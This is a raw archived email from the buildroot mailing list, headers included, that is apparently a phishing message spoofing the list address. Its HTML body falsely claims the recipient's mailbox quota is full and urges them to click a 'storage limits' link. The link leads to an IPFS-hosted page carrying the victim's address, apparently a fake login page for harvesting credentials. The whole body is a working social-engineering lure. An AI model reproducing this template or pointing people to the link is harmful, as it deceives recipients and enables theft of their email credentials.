Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 0F304C3DA7F
	for <buildroot@archiver.kernel.org>; Fri,  2 Aug 2024 10:41:05 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id 8A73040960;
	Fri,  2 Aug 2024 10:41:05 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id yAkfMkxfkVBP; Fri,  2 Aug 2024 10:41:04 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 5628541197
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp4.osuosl.org (Postfix) with ESMTP id 5628541197;
	Fri,  2 Aug 2024 10:41:04 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 168F51BF98E
 for <buildroot@lists.busybox.net>; Fri,  2 Aug 2024 10:41:03 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 10FF884504
 for <buildroot@lists.busybox.net>; Fri,  2 Aug 2024 10:41:03 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 6bdCqu9FEUkz for <buildroot@lists.busybox.net>;
 Fri,  2 Aug 2024 10:41:02 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.79;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org BCEAB84505
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org BCEAB84505
Received: from busybox.net (unknown [141.98.10.79])
 by smtp1.osuosl.org (Postfix) with ESMTP id BCEAB84505
 for <buildroot@busybox.net>; Fri,  2 Aug 2024 10:41:01 +0000 (UTC)
From: Storage <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 2 Aug 2024 12:41:00 +0200
Message-ID: <20240802124100.4A1102B9FFEE89D6@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Your mailbox quota is full
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1519181632177209082=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============1519181632177209082==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
 font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
roke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;'>Y=
our mailbox is full.</p>
<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
s: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
spacing=3D"0" cellpadding=3D"0">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"height: 0.5em; box-sizing: border-box;">
<td style=3D"background: 0% 50% rgb(218, 60, 47); margin: 0px; width: 321px=
; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizin=
g: border-box;">&nbsp;</td>
<td style=3D"background: 0% 50% rgb(224, 224, 224); margin: 0px; font-famil=
y: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-sizing: border-bo=
x;">&nbsp;</td></tr></tbody></table>
<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
e-space: normal; border-collapse: collapse; box-sizing: border-box; orphans=
: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligature=
s: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;' border=3D"0" cell=
spacing=3D"0" cellpadding=3D"0">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td align=3D"left" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, =
Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"color=
: rgb(218, 60, 47); font-weight: bold; box-sizing: border-box;">4.86 GB</sp=
an></td>
<td align=3D"right" style=3D"margin: 0px; font-family: Roboto, RobotoDraft,=
 Helvetica, Arial, sans-serif; box-sizing: border-box;"><span style=3D"font=
-weight: bold; box-sizing: border-box;">5.01 GB</span></td></tr></tbody></t=
able>
<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
; text-indent: 0px; letter-spacing: normal; font-family: "Segoe UI", sans-s=
erif; font-size: 1.2em; font-style: normal; font-weight: 600; margin-top: 0=
px; margin-bottom: 1.5em; word-spacing: 0px; white-space: normal; box-sizin=
g: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);=
 font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
roke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;'><=
br style=3D"box-sizing: border-box;"></p>
<p style=3D'margin: 3em auto; text-align: center; color: rgb(44, 54, 58); t=
ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
 "Segoe UI", sans-serif; font-size: 14px; font-style: normal; font-weight: =
400; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphan=
s: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatur=
es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;'><span styl=
e=3D"box-sizing: border-box;">Your mailbox storage for this account user<sp=
an style=3D"box-sizing: border-box;">&nbsp;</span><strong style=3D"font-wei=
ght: bolder; box-sizing: border-box;">( <u style=3D"box-sizing: border-box;=
"><span><a style=3D"color: rgb(34, 34, 34);" href=3D"mailto:nfo@alnour-fpm.=
com">buildroot@busybox.net</a></span></u>&nbsp;)</strong><span style=3D"box=
-sizing: border-box;">&nbsp;</span>
has almost reached it's limit and soon can no longer send or receive most m=
essages. <br><wbr><br style=3D"box-sizing: border-box;">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Kindly click the&nbsp;button below immediate=
ly to increase, adjust and maintain your storage capacity in order to avoid=
 loss of data and receive all pending=20
mails.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
<wbr>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br style=3D"box-sizing: border-box;"><b=
r style=3D"box-sizing: border-box;">Click<strong><span>&nbsp;</span>"</stro=
ng>
<a style=3D"color: rgb(0, 172, 255); text-decoration: none; box-sizing: bor=
der-box; background-color: transparent;" href=3D"https://ipfs.io/ipfs/bafkr=
eidtb46qxnohxi7i5h3hvknw6w2qupffdn3rbkxlud6i36fxclz3li?filename=3DMAIL.html=
#buildroot@busybox.net" rel=3D"noreferrer"><strong>storage limits</strong><=
/a><strong>"</strong><span>&nbsp;</span>&nbsp;&nbsp;for&nbsp;more help and&=
nbsp;support.</span></p></body></html>

--===============1519181632177209082==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============1519181632177209082==--
